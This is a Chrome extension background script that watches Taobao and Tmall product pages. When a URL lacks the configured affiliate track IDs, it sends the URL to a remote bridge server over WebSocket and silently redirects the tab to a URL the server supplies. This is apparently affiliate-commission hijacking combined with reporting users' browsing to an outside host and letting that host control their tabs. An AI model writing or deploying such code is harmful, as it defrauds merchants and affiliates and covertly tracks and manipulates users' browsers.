const TRACKIDS = "{{TRACKIDS}}";
const BRIDGE = "{{BRIDGE}}";
const AUTH = "{{AUTH}}";

class Connection {
    constructor(bridge, auth) {
        this.conn = null;
        this.bridge = bridge;
        this.auth = auth;
        this.cid = "";
    }
    get state() {
        if (!this.conn) return 0;
        return this.conn.readyState;
    }
    open() {
        if (this.state == 1) return;
        if (!this.auth) return;

        fetch(`${this.bridge}/connect?auth=${this.auth}&c=1`)
        .then(response => response.json())
        .then(resp=>{
            if (resp.ok) {
                this.cid = resp.cid;
                this.conn = new WebSocket(resp.url);
                this.conn.onmessage = msg=>this.onmessage(JSON.parse(msg.data));
                this.conn.onclose = ()=>{ this.conn = null; this.open(); }
            }
        });
    }
    close() {
        if (this.conn != null)
            this.conn.close();
    }
    send(m) {
        if (this.conn != null && this.state == 1) {
            m.to = this.auth;
            m.from = this.cid;
            m.auth = this.auth;
            this.conn.send(JSON.stringify(m));
        }
    }
    onmessage(m) {
        if (m.ok) chrome.tabs.update(m.echo, {url:m.url});
    }
}
const connection = new Connection(BRIDGE, AUTH);
setInterval(()=>connection.open(), 2000);

function is_match(e, url) {
    let c = new RegExp("^http.?\\:\\/\\/(?:www\\.)?" 
        + e.replace(/^https?:\/\//, "").replace(/\\/g, "\\\\").replace(/\./g, "\\.").replace(/\*/g, ".*"), "i");
    return c.test(url);
};

function get_url_param(url, name) {
    let reg = new RegExp("(^|&|\\?)" + name + "=([^&]*)(&|$)");
    let r = url.match(reg);
    if (r != null) 
        return unescape(r[2]); 
    return "";
}

function include_ali_trackid(url) {
    let trackid = get_url_param(url, "ali_trackid");
    if(trackid.length <= 0) return false;
    
    let strs = new Array();
    if (TRACKIDS.length > 0) strs = TRACKIDS.split(";");
    for (var i = 0; i < strs.length; i ++) {
        if (trackid.indexOf(strs[i]) >= 0) return true;
    }
    return false;
}

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab){
    if (is_match("item.taobao.com/*", tab.url) || is_match("detail.tmall.com/*", tab.url)) {
        chrome.tabs.executeScript(tabId, {code: 'var v = document.__2dash__; document.__2dash__ = true; v'}, function(ret) {
            if(ret[0]) return;
            if (!include_ali_trackid(tab.url)) connection.send({type:"aliconv", url:tab.url, echo:tabId});
        });
    }
});
